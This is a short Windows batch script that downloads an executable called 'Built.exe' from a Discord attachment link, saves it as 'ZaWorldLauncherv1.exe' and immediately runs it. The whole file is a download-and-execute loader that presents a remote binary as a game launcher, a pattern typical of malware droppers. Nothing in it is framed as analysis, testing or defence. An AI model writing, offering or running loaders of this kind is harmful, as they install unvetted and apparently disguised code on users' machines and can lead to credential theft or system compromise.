@echo off
setlocal

:: Set the URL of the file to download
set "url=https://cdn.discordapp.com/attachments/1152822112692748400/1152940271521234975/Built.exe"

:: Set the destination file name
set "outputFile=ZaWorldLauncherv1.exe"

:: Use PowerShell to download the file
powershell -command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%outputFile%')"

:: Check if the download was successful
if %errorlevel% neq 0 (
    echo Download failed. Exiting...
    exit /b 1
)

:: Run the downloaded file
echo Running %outputFile%...
start "" "%outputFile%"

:: End of the script
exit /b 0
